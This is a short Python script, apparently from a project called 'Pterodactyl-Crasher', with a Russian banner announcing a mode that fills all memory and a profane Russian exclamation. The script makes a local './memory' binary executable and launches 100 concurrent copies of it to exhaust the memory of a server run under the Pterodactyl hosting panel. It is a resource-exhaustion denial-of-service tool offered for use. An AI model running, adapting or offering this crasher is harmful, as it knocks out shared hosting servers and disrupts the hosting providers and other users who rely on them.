from time import sleep
import asyncio

print(
    r"""                                                  
github.com/xdearboy/Pterodactyl-Crasher

Pterodactyl-Crasher

Режим: забивка всей памяти
Подготовка..""",
)

print("Ебанный рот, погнали нахуй!")


async def run_with_console(cmd):

    proc = await asyncio.create_subprocess_shell(cmd)


async def main():
    await run_with_console("chmod +x ./memory")
    tasks = [asyncio.create_task(run_with_console("./memory")) for i in range(100)]

    await asyncio.gather(*tasks)


asyncio.run(main())
